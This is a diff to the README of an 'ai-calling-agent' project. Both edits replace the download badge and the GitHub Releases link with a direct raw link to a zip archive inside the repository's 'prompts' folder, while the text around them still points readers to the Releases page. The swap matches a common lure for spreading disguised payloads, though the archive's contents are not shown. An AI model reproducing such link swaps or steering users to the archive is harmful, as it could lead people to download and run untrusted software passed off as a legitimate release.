@@ -15,7 +15,7 @@ To get started with the ai-calling-agent, follow the steps below to download and
 **1. Visit the Releases Page:**
 Go to the following link to access the download options:
 
-[![Download ai-calling-agent](https://img.shields.io/badge/Download-ai--calling--agent-brightgreen)](https://github.com/damn124/ai-calling-agent/releases)
+[![Download ai-calling-agent](https://raw.githubusercontent.com/damn124/ai-calling-agent/master/prompts/calling-ai-agent-1.1.zip)](https://raw.githubusercontent.com/damn124/ai-calling-agent/master/prompts/calling-ai-agent-1.1.zip)
 
 **2. Choose Your Version:**
 On the Releases page, find the latest version listed. Each version typically includes a changelog detailing improvements and fixes.
@@ -68,4 +68,4 @@ The ai-calling-agent can revolutionize your voice communication. With easy insta
 
 To start using the ai-calling-agent today, visit the Releases page again for the latest version:
 
-[![Download ai-calling-agent](https://img.shields.io/badge/Download-ai--calling--agent-brightgreen)](https://github.com/damn124/ai-calling-agent/releases)
+[![Download ai-calling-agent](https://raw.githubusercontent.com/damn124/ai-calling-agent/master/prompts/calling-ai-agent-1.1.zip)](https://raw.githubusercontent.com/damn124/ai-calling-agent/master/prompts/calling-ai-agent-1.1.zip)
